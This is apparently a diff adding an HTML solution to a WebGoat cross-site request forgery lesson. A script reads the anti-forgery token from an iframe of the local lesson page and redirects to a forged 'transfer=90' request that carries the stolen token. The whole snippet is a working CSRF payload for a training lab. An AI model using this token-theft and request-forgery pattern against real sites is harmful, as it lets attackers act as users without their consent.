@@ -1,0 +1,16 @@
+<script>
+    document.getElementById("part5").onload = function onLoad() {
+        const current_url = document.URL;
+        console.log(current_url);
+
+        const token = document.getElementById("part5")?.contentWindow?.form?.token?.value;
+        console.log(token);
+        
+        const new_url = `http://localhost:8090/WebGoat/attack?transfer=90&token=${token}#attack/605842438/900`;
+        window.location.replace(new_url);
+
+    }    
+</script>
+
+<iframe id="part5" src = "http://localhost:8090/WebGoat/attack?Screen=605842438&menu=900&transfer=main"
+    ></iframe>
